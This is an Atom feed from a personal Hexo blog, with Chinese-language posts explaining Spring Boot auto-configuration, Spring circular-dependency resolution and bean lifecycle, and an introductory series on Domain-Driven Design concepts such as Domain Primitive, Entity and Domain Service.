<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Anderson&#39;s blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-04-03T14:32:30.274Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Anderson Lee</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SpringBoot自动装配机制</title>
    <link href="http://example.com/2022/04/03/Spring/SpringBoot%E8%87%AA%E5%8A%A8%E8%A3%85%E9%85%8D%E6%9C%BA%E5%88%B6/"/>
    <id>http://example.com/2022/04/03/Spring/SpringBoot%E8%87%AA%E5%8A%A8%E8%A3%85%E9%85%8D%E6%9C%BA%E5%88%B6/</id>
    <published>2022-04-03T14:13:06.000Z</published>
    <updated>2022-04-03T14:32:30.274Z</updated>
    
    <content type="html"><![CDATA[<p>自动装配机制简单来说就是自动把第三方组件的Bean装载到Ioc容器当中，不再需要开发人员再去写bean，相关的一个配置，SpringBoot应用里只需要再启动类加上@SpringBootApplication注解就可以实现自动装配</p><img src="/2022/04/03/Spring/SpringBoot%E8%87%AA%E5%8A%A8%E8%A3%85%E9%85%8D%E6%9C%BA%E5%88%B6/image-20220403221553586.png" class><p>可以看到@SpringBootApplication里又有很多别的注解</p><img src="/2022/04/03/Spring/SpringBoot%E8%87%AA%E5%8A%A8%E8%A3%85%E9%85%8D%E6%9C%BA%E5%88%B6/image-20220403221709972.png" class><p>最主要的就是@EnableAutoConfiguration注解</p><img src="/2022/04/03/Spring/SpringBoot%E8%87%AA%E5%8A%A8%E8%A3%85%E9%85%8D%E6%9C%BA%E5%88%B6/image-20220403221806622.png" class><p>自动装配原理主要依靠三个核心关键技术</p><ol><li>引入stater</li></ol><p>启动组件的时候，组件必须有一个@Configuration配置类，在这个配置类我们需要通过@Bean这个注解声明需要去装配到Ioc容器里的Bean对象</p><ol start="2"><li>这个配置类是放在第三方jar包里面</li></ol><p>通过spring boot约定大于配置的理念把这个配置类的全路径放在classpath:&#x2F;META-INF&#x2F;spring.factories,这样spring boot就可以知道嗲三方jar包里的这个配置类的位置，这主要是用到了springFactoriesLoader来完成</p><ol start="3"><li>Spring Boot拿到所有jar包以后</li></ol><p>通过spring提供的importSelector这样的接口来对这些配置类的动态加载，从而完成自动装配</p><p>关于重写spring boot的stater方法</p><figure class="highlight java"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-meta">@EnableConfigurationProperties(&#123;</span><br><span class="hljs-meta">        EnforcementProperties.class, SiteProperties.class, ConvictionProperties.class,</span><br><span class="hljs-meta">        RadiusProperties.class, RabbitPoolProperties.class, SyslogProperties.class,</span><br><span class="hljs-meta">        RestDynamicAuthorizationProperties.class, AuthorizationProperties.class,</span><br><span class="hljs-meta">&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Application</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">var</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> SpringApplication.run(Application.class, args);<br>        context.getBean(Bootstrap.class).run();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这是我的老大写的一段启动代码，可以看到@EnableConfigurationProperties注解可以去加载相应的类，然后context就相当于加载好了配置文件，然后可以通过getBean获取相应的bean然后执行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;自动装配机制简单来说就是自动把第三方组件的Bean装载到Ioc容器当中，不再需要开发人员再去写bean，相关的一个配置，SpringBoot应用里只需要再启动类加上@SpringBootApplication注解就可以实现自动装配&lt;/p&gt;
&lt;img src=&quot;/2022/0</summary>
      
    
    
    
    <category term="Spring" scheme="http://example.com/categories/Spring/"/>
    
    
    <category term="Spring" scheme="http://example.com/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>Spring如何解决循环依赖</title>
    <link href="http://example.com/2022/04/03/Spring/Spring%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96/"/>
    <id>http://example.com/2022/04/03/Spring/Spring%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96/</id>
    <published>2022-04-03T13:50:47.000Z</published>
    <updated>2022-04-03T14:11:47.829Z</updated>
    
    <content type="html"><![CDATA[<p>如果在 代码中把两个或者两个以上的Bean相互之间持有，对方的引用就会产生循环依赖（类似死锁），而循环依赖又会导致死循环，这是发生spring循环依赖的原因<br>spring循环依赖有三种</p><h2 id="依赖方式"><a href="#依赖方式" class="headerlink" title="依赖方式"></a>依赖方式</h2><h3 id="相互依赖"><a href="#相互依赖" class="headerlink" title="相互依赖"></a>相互依赖</h3><p>也就是A依赖B，B又依赖A，它们之间形成一个循环</p><img src="/2022/04/03/Spring/Spring%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96/image-20220403215426283.png" class><p>如图所示</p><h3 id="三者依赖"><a href="#三者依赖" class="headerlink" title="三者依赖"></a>三者依赖</h3><p>第二种是三者之间的依赖，也就是A依赖B，B依赖C，C依赖A</p><img src="/2022/04/03/Spring/Spring%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96/image-20220403215537436.png" class><h3 id="自我依赖"><a href="#自我依赖" class="headerlink" title="自我依赖"></a>自我依赖</h3><p>也就是A依赖A</p><img src="/2022/04/03/Spring/Spring%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96/image-20220403215654849.png" class><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>Spring设置了三级缓存去解决循环依赖问题，当我们去通过getBean去获取对象实例的时候，spring会先去一级缓存去查找，如果一级缓存没有就会去二级缓存查找，如果都没有找到，那就意味着这个对象没有被实例化，那soring就会去实例化这个bean，而初始化的这个bean我们先把它称之为早期的bean，会把目标bean放在二级缓存，同时加入一个标记，表示它是否存在循环依赖，如果不存在，就把它放在二级缓存，否则就标记这个bean存在循环依赖，然后等待下一次轮询的时候去复制，也就是解析Autowired注解，等Autowired复制完以后，会将目标bean放在一级缓存</p><img src="/2022/04/03/Spring/Spring%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96/image-20220403220347120.png" class><p>一级缓存用于存放所有的成熟的bean，二级缓存存放所有的早期把bean，先去取一级缓存，后去取二级缓存</p><p>三级缓存用来存储代理bean，当调用getBean的时候，发现目标bean需要通过代理工厂来创建，这个时候会把对象保存到三级缓存，最后会把复制好的bean放在一级缓存</p><h2 id="无法解决循环依赖的情况"><a href="#无法解决循环依赖的情况" class="headerlink" title="无法解决循环依赖的情况"></a>无法解决循环依赖的情况</h2><ol><li>多实例的bean通过setter方法不能解决循环依赖</li><li>构造器注入bean的情况</li><li>单例代理的bean通过setter注入的情况下</li><li>设置@DependsOn注解的bean</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;如果在 代码中把两个或者两个以上的Bean相互之间持有，对方的引用就会产生循环依赖（类似死锁），而循环依赖又会导致死循环，这是发生spring循环依赖的原因&lt;br&gt;spring循环依赖有三种&lt;/p&gt;
&lt;h2 id=&quot;依赖方式&quot;&gt;&lt;a href=&quot;#依赖方式&quot; class=&quot;</summary>
      
    
    
    
    <category term="Spring" scheme="http://example.com/categories/Spring/"/>
    
    
    <category term="Spring" scheme="http://example.com/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>SpringBean生命周期</title>
    <link href="http://example.com/2022/04/03/Spring/SpringBean%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/"/>
    <id>http://example.com/2022/04/03/Spring/SpringBean%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/</id>
    <published>2022-04-03T13:48:06.000Z</published>
    <updated>2022-04-03T13:49:52.185Z</updated>
    
    <content type="html"><![CDATA[<h2 id="spring-bean生命周期"><a href="#spring-bean生命周期" class="headerlink" title="spring bean生命周期"></a>spring bean生命周期</h2><p>大致分为5个阶段</p><h3 id="创建前准备"><a href="#创建前准备" class="headerlink" title="创建前准备"></a>创建前准备</h3><img src="/2022/04/03/Spring/SpringBean%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/image-20220403213005817.png" class><p>这个阶段是bean在开始加载之前要从上下文和一些配置当中去解析和查找和bean有关的扩展实现比如像“init_method”是容器在初始化bean的时候会调用的方法，destory是bean在销毁的时候会去调用的方法。以及beanFactoryPostProcessor这一类的bean,加载过程中的一些前置和后置的一些扩展实现，这些类和配置是spring提供给开发者用来去实现bean,加载过程中的一些扩展，在很多spring集成的中间件比较常见</p><h3 id="创建实例化"><a href="#创建实例化" class="headerlink" title="创建实例化"></a>创建实例化</h3><img src="/2022/04/03/Spring/SpringBean%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/image-20220403213531512.png" class><p>这个阶段是通过反射去创建bean的实例对象，并且会扫描和解析bean声明的一些属性，</p><h3 id="依赖注入"><a href="#依赖注入" class="headerlink" title="依赖注入"></a>依赖注入</h3><img src="/2022/04/03/Spring/SpringBean%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/image-20220403213637070.png" class><p>如果被实例化的bean存在依赖其他bean的一些情况，那就需要对这些依赖的bean进行对象的注入，比如常见的@Autowired,以及setter注入，这样的一些配置形式，同时这些时间会出发一些扩展的调用，比如常见的扩展类BeanPostPreocessors,用来实现Bean的初始化前后的扩展回调</p><h3 id="容器缓存"><a href="#容器缓存" class="headerlink" title="容器缓存"></a>容器缓存</h3><img src="/2022/04/03/Spring/SpringBean%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/image-20220403213955349.png" class><p>把bean保存到容器当中，以及spring的容器当中，此时的bean就可以被开发者去使用了，init method方法就会在这个阶段被调用，以及BeanPostPreocessors的后置方法，</p><h3 id="销毁实例"><a href="#销毁实例" class="headerlink" title="销毁实例"></a>销毁实例</h3><img src="/2022/04/03/Spring/SpringBean%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/image-20220403214152446.png" class><p>最后就是销毁阶段，当spring的应用上下文被关闭的时候，这个上下文当中的所有的bean就会被销毁，如果存在bean实现了DisposableBean接口，或者配置了destory_method属性的一些方法，会在这个阶段被调用</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;spring-bean生命周期&quot;&gt;&lt;a href=&quot;#spring-bean生命周期&quot; class=&quot;headerlink&quot; title=&quot;spring bean生命周期&quot;&gt;&lt;/a&gt;spring bean生命周期&lt;/h2&gt;&lt;p&gt;大致分为5个阶段&lt;/p&gt;
&lt;h3 i</summary>
      
    
    
    
    <category term="Spring" scheme="http://example.com/categories/Spring/"/>
    
    
    <category term="Spring" scheme="http://example.com/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>DDD入门五板斧（三）统一语言和模型价值</title>
    <link href="http://example.com/2022/04/03/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%89%EF%BC%89%E7%BB%9F%E4%B8%80%E8%AF%AD%E8%A8%80%E5%92%8C%E6%A8%A1%E5%9E%8B%E4%BB%B7%E5%80%BC/"/>
    <id>http://example.com/2022/04/03/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%89%EF%BC%89%E7%BB%9F%E4%B8%80%E8%AF%AD%E8%A8%80%E5%92%8C%E6%A8%A1%E5%9E%8B%E4%BB%B7%E5%80%BC/</id>
    <published>2022-04-03T11:50:39.000Z</published>
    <updated>2022-04-03T13:21:35.279Z</updated>
    
    <content type="html"><![CDATA[<p>在前两篇文章我们主要讲了领域驱动设计上的DP Entity Repository以及相应的代码实现。现在我们聊聊领域驱动设计在宏观上的几个概念。</p><h3 id="DP"><a href="#DP" class="headerlink" title="DP"></a>DP</h3><p>DP也可以被称为VO(ValueObject),这里的value object是DDD语境下的概念</p><img src="/2022/04/03/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%89%EF%BC%89%E7%BB%9F%E4%B8%80%E8%AF%AD%E8%A8%80%E5%92%8C%E6%A8%A1%E5%9E%8B%E4%BB%B7%E5%80%BC/image-20220403204011544.png" class><h4 id="统一语言-Ubiquitous-Language"><a href="#统一语言-Ubiquitous-Language" class="headerlink" title="统一语言(Ubiquitous Language)"></a>统一语言(Ubiquitous Language)</h4><img src="/2022/04/03/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%89%EF%BC%89%E7%BB%9F%E4%B8%80%E8%AF%AD%E8%A8%80%E5%92%8C%E6%A8%A1%E5%9E%8B%E4%BB%B7%E5%80%BC/image-20220403204320736.png" class><p>在做一个东西的时候，我们需要有领域专家和相关技术人员一起去进行螺旋式的建模，通过形成UL消化业务知识，然后向模型中提炼知识，如此往复.</p><p><strong>一个好的模型价值千金</strong></p><p>星盘由古希腊人发明，星盘上可旋转的铜环代表各个恒星在天体上的位置</p><img src="/2022/04/03/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%89%EF%BC%89%E7%BB%9F%E4%B8%80%E8%AF%AD%E8%A8%80%E5%92%8C%E6%A8%A1%E5%9E%8B%E4%BB%B7%E5%80%BC/image-20220403204840264.png" class><p>刻有当地地平坐标系的盘面是可替换的，它代表不同维度的星空景象，我们可以计算出任何时刻的天体位置，反之，如果知道恒星在天体上的位置也能反向计算出时间。这里星盘用机械的方式建立了<strong>恒星和时间的对象模型</strong>，而我们也可以使用软件来计算出这样的模型，但是我们需要首先向天文学家学习专业的天文领域知识，然后进行建模，我们需要去适应不断变化的星空，不能因为更改了坐标系而失效，不能因为新加入一颗恒星就失效。</p><p>领域驱动设计就是一套方法论，帮助我们建立良好的对象模型</p><img src="/2022/04/03/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%89%EF%BC%89%E7%BB%9F%E4%B8%80%E8%AF%AD%E8%A8%80%E5%92%8C%E6%A8%A1%E5%9E%8B%E4%BB%B7%E5%80%BC/image-20220403205526736.png" class><p>为了建设有价值的模型，我们需要在形成UL的基础上消化知识，并向模型中提炼知识</p><h3 id="DP-amp-Entity"><a href="#DP-amp-Entity" class="headerlink" title="DP &amp; Entity"></a>DP &amp; Entity</h3><img src="/2022/04/03/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%89%EF%BC%89%E7%BB%9F%E4%B8%80%E8%AF%AD%E8%A8%80%E5%92%8C%E6%A8%A1%E5%9E%8B%E4%BB%B7%E5%80%BC/image-20220403205800590.png" class><p>充血模型就是除了赋予对象除了属性和属性的读写方法之外，包含业务逻辑的行为，比如身份证对象去能自己验证身份证号是否符合规范，这样就能让模型本身高内聚，而不是每次设计一个业务操作就去交给其他对象处理，形成紧耦合。所以哪些对象应该被包含、哪些又应该去被拆分出去，这就要依靠我们的经验了。<strong>自治的、丰富的、有活力的</strong></p><p>DP无状态而Entity有状态，什么是状态？</p><ol><li>该对象是否存在生命周期</li><li>程序是否需要追踪改对象的变化事件</li></ol><p>这里进行一个简单的解释：我们知道在体育馆有很多的座位</p><img src="/2022/04/03/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%89%EF%BC%89%E7%BB%9F%E4%B8%80%E8%AF%AD%E8%A8%80%E5%92%8C%E6%A8%A1%E5%9E%8B%E4%BB%B7%E5%80%BC/image-20220403210511727.png" class><p>假如观众通过预定程序买了票，每张票都有一个座位号相对应，在这里座位就是有状态的，也就是Entity,程序需要去关注对象的事件变化，比如通过唯一ID去追踪该对象，关注它的预定状态，价格、位置等属性</p><p>假如用户通过预定程序买了票，只要进去就可以随便坐，这里座位就是无状态的，程序不需要对每个座位进行追踪，只需要关注总数量就可以了，这就是DP和Entity的异同之处</p><p>总的来说就是：<strong>为了建设有价值的模型，在确认UL之后消化领域知识，向无状态的DP和有状态的Entity中提炼知识</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在前两篇文章我们主要讲了领域驱动设计上的DP Entity Repository以及相应的代码实现。现在我们聊聊领域驱动设计在宏观上的几个概念。&lt;/p&gt;
&lt;h3 id=&quot;DP&quot;&gt;&lt;a href=&quot;#DP&quot; class=&quot;headerlink&quot; title=&quot;DP&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    <category term="DDD" scheme="http://example.com/categories/DDD/"/>
    
    
    <category term="DDD" scheme="http://example.com/tags/DDD/"/>
    
  </entry>
  
  <entry>
    <title>DDD入门五板斧（二）EntityAndDomainService</title>
    <link href="http://example.com/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/"/>
    <id>http://example.com/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/</id>
    <published>2022-04-02T10:19:01.000Z</published>
    <updated>2022-04-03T11:51:41.971Z</updated>
    
    <content type="html"><![CDATA[<p>根据上一篇文章，我们主要是引入了DP这个概念，简单来说，DP就是构建领域的基础类型，并通过对一个实际例子的改造，展示了DP在明确接口语义，内聚隐形逻辑，简化单元测试方面的作用。本期我们将通过拓展这个业务案例来引入新的概念Entity&amp;DomainService。同时讲一讲工程设计上的一些要点</p><p>假如我们现在做一个简单的数据统计系统，地推员输入客户姓名和手机号。根据客户手机号的归属地和所属运营商，将客户群体分组，分配给相应销售组，由销售组跟进后续业务。</p><img src="/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/image-20220403182443211.png" class><p>如图是我们上一节完成的相关代码</p><p>现在我们新加入一些业务需求：</p><ol><li>需要对手机号进行实名验证，假设由中国移动提供此服务。</li><li>根据外部服务返回的实名信息，按照一定逻辑计算出用户标签，并且记录在用户的账号。</li><li>根据用户标签为该用户开通相应等级的新客福利</li></ol><img src="/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/image-20220403182836740.png" class><p>如图为业务流程图</p><img src="/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/image-20220403183042743.png" class><p>如图为相关业务代码</p><p>下面我们从三个方面对以上代码进行分析与重构</p><h3 id="对外部依赖的耦合十分严重"><a href="#对外部依赖的耦合十分严重" class="headerlink" title="对外部依赖的耦合十分严重"></a>对外部依赖的耦合十分严重</h3><p>什么是外部服务？</p><p>一切不属于当前域的设施与服务都属于外部服务。比如数据库、数据库schema、ORM框架、中间件等属于计算机内部而不属于当前业务的服务。</p><p>比如一个系统可能要从MySQL替换为PostgreSQL, 比如一张表添加了几个字段，比如外部系统的变动会影响RPC接口变动。这些东西不属于业务本身，我们对于这些东西没有控制权，而我们要做的就是即使这些依赖发生变化，我们的业务本身也不能改变，或者说尽量少改动，这就体现了一个代码的可维护性，现在我们来分析上述代码的可维护性。</p><h4 id="对数据库的schema依赖"><a href="#对数据库的schema依赖" class="headerlink" title="对数据库的schema依赖"></a>对数据库的schema依赖</h4><img src="/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/image-20220403183935164.png" class><p>这段代码就是典型的面向数据库编程，主要操作就是从数据表读入信息，然后增加一些信息并写入。这里的业务代码强依赖了数据库的schema，也就是DO类，在这里如果数据表字段发生变化，那对应的DO类就会残生变动，业务代码就不得不发生改变。如果此时业务更加复杂，那DO类就会被改的面目全非。</p><h4 id="对数据库ORM依赖"><a href="#对数据库ORM依赖" class="headerlink" title="对数据库ORM依赖"></a>对数据库ORM依赖</h4><img src="/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/image-20220403184557539.png" class><p>这里使用到了我们常见的mybatis,假如我们现在需要升级ORM框架，或者替换掉ORM框架，那此时业务代码就必须要大量进行改动</p><h4 id="RPC服务依赖"><a href="#RPC服务依赖" class="headerlink" title="RPC服务依赖"></a>RPC服务依赖</h4><p>这里使用了中国电信提供的实名信息查询服务，并且强依赖于业务逻辑，假设中国电信提供该接口的入参和返参都产生变化，那逻辑代码就会去产生变化</p><p>由此可见，这个代码耦合度非常之高，形成耦合的原因是什么？</p><p>主要原因就是我们是面向实现编程。那我们就需要把它改变为面向抽象接口编程，领域驱动就会成为一种指导思想，辅助我们设计</p><p>抽象接口本身就像是一种中间协议，依赖方和被依赖方都要对这个协议负责，接口将软件分层隔离，这种隔离下，任何一方变动都会被控制在可控制的范围之内</p><img src="/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/image-20220403190530204.png" class><p>这里我们改动如下：</p><h4 id="数据库的schema依赖改造"><a href="#数据库的schema依赖改造" class="headerlink" title="数据库的schema依赖改造"></a>数据库的schema依赖改造</h4><ol><li>使用realnameService接口替代了TeleComRealNameService的具体实现，注册逻辑中的具体实现对象（联通或者电信）是通过配置来注入的这就产生了控制反转类似于Spring</li><li>使用RealnameInfo这个DP，代替TelecomInfoDTO的具体实现这样后续业务只需要关注RealnameInfo的返回结构而不需要去改具体的业务上的逻辑。这样无论是参数变化还是其他变化，我们都只用去改变配置文件或者具体实现类</li></ol><p>这里浅提一个概念：防腐层，也就是防止外部系统腐烂影响到我们的系统。如RealnameInfo</p><h4 id="对数据库ORM依赖依赖改造"><a href="#对数据库ORM依赖依赖改造" class="headerlink" title="对数据库ORM依赖依赖改造"></a>对数据库ORM依赖依赖改造</h4><ol><li>DO作为数据表的直接映射属于具体实现，不应该去暴露给业务逻辑</li><li>DAO作为数据访问层的具体实现不应该暴露给业务层，我们这里引入新的概念Entity&amp;DomainService，老代码依赖于业务逻辑，也就是直接依赖DO和DAO，事实上业务逻辑应该去面向领域实体，而不是去关心对象被后是否使用了数据库，更不用关心数据表中的相关字段。也就是上层业务逻辑不需要去关心下层实现</li></ol><img src="/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/image-20220403191843999.png" class><p>这里我们定义User类为领域实体，这里的属性用于描述在这个系统内客户应该去含有的信息，可以尽量多使用DP来将自检和隐性属性内聚起来，定义User类的时候，我们不要关心下层数据库的具体实现，甚至最后User一部分信息位于内存，一部分位于数据库，这都无所谓。</p><p>这里的Entity是一种有状态的领域实体，就像是一种动态的东西。而DP是一种无状态，组成实体的基础类型。</p><p>比如phoneNumber是无状态的而User是有状态的。</p><img src="/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/image-20220403192351148.png" class><p>而此时，我们的repository就是一种一种具体的对于数据库的操作，而这里的对于数据库的操作就比较随意，这里可以对于各种数据库去操作</p><img src="/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/image-20220403192624321.png" class><p>此时改造后的业务代码，此时结构更加清晰，核心业务逻辑不再依赖其他任何实现，无论外部依赖如何变化，业务逻辑层都不会变化。</p><h4 id="内部逻辑耦合"><a href="#内部逻辑耦合" class="headerlink" title="内部逻辑耦合"></a>内部逻辑耦合</h4><p>我们可以看到最初的代码register方法耦合了各种业务逻辑，比如参数一致性验证、计算用户标签、查询绑定的销售组信息。参数一致性校验，计算用户标签等。而这里的业务逻辑不应该是我们这里所应该去关心的，也就是说如果用户标签发生变化，或其他逻辑发生变化，那业务层就必须发生变化。</p><img src="/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/image-20220403193210941.png" class><p>这里我们进行了一定程度的解耦，可以看到，此时发奖逻辑和风控检查这种逻辑关系依然位于注册业务，而注册业务本身应该是保存新用户才对。而发奖的原因就是为了给用户一些福利，假如我们以后不愿意去发放福利了呢？它的本质是为了判断用户是否是新用户而衍生的一种操作，那在注册的业务域当中，我们把它的行为抽象为<strong>获取用户信息，检查并且更新用户，存储用户</strong>这三个步骤，而检查并更新用户里又存在发奖行为</p><img src="/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/image-20220403193832637.png" class><p>这里经过改变以后，checkUserService可能会改变User或者Reward对象的状态，涉及到了多个Entity状态改变的服务。被称为<strong>Domain Service</strong>,它主要用于封装多Entity或跨业务域的逻辑</p><img src="/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/image-20220403194132902.png" class><p>此时一旦改变需要测试的成本不言而喻</p><h3 id="思想"><a href="#思想" class="headerlink" title="思想"></a>思想</h3><img src="/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/image-20220403194441350.png" class><p>如图为领域驱动设计的一些思想和设计过程，在日常设计中我们一定要去遵循高内聚、低耦合的思想</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;根据上一篇文章，我们主要是引入了DP这个概念，简单来说，DP就是构建领域的基础类型，并通过对一个实际例子的改造，展示了DP在明确接口语义，内聚隐形逻辑，简化单元测试方面的作用。本期我们将通过拓展这个业务案例来引入新的概念Entity&amp;amp;DomainService。同时</summary>
      
    
    
    
    <category term="DDD" scheme="http://example.com/categories/DDD/"/>
    
    
    <category term="DDD" scheme="http://example.com/tags/DDD/"/>
    
  </entry>
  
  <entry>
    <title>DDD入门五板斧（一）DomainPrimitive</title>
    <link href="http://example.com/2022/04/01/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%80%EF%BC%89DomainPrimitive/"/>
    <id>http://example.com/2022/04/01/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%80%EF%BC%89DomainPrimitive/</id>
    <published>2022-04-01T10:06:22.000Z</published>
    <updated>2022-04-03T11:51:41.981Z</updated>
    
    <content type="html"><![CDATA[<p>DDD入门五板斧（一）Domain Primitive</p><p>DDD即Domain-Driven Design，领域驱动设计是现在一种很火的设计思想。</p><p> 什么是领域？</p><p>暂且理解为“业务问题的范畴”</p><p>领域可大可小，对应着大小业务问题的边界，简单来说领域驱动设计就是将业务上要做的一件大事通过推演和抽象，拆分为多个内聚的领域，这是为了去降低软件开发维护复杂度，遵循解耦的原则。</p><h2 id="进入业务"><a href="#进入业务" class="headerlink" title="进入业务"></a>进入业务</h2><p>假如我们现在做一个简单的数据统计系统，地推员输入客户姓名和手机号。根据客户手机号的归属地和所属运营商，将客户群体分组，分配给相应销售组，由销售组跟进后续业务。</p><img src="/2022/04/01/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%80%EF%BC%89DomainPrimitive/image-20220403164902553.png" class><p>如图为实现流程图</p><p>我们定义一个User类，一个注册接口的具体实现类，注册方法先对参数进行校验然后通过手机号分别获得归属地编号和运营商编号，然后通过这两个编号去查询数据，获取分组编号，最后构造用户对象来存入数据表</p><img src="/2022/04/01/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%80%EF%BC%89DomainPrimitive/image-20220403165228812.png" class><p>这样写的代码在我们的小项目里又快又好，非常合适。</p><p>但是如果是在一个大项目里面呢？</p><p><strong>注意：</strong>我们学习DDD不是为了去对所有简单的逻辑都去进行重构，而是为了去为了项目能适应复杂的需求变化</p><p>下面我们去分析以上的代码</p><h3 id="接口语义与参数校验"><a href="#接口语义与参数校验" class="headerlink" 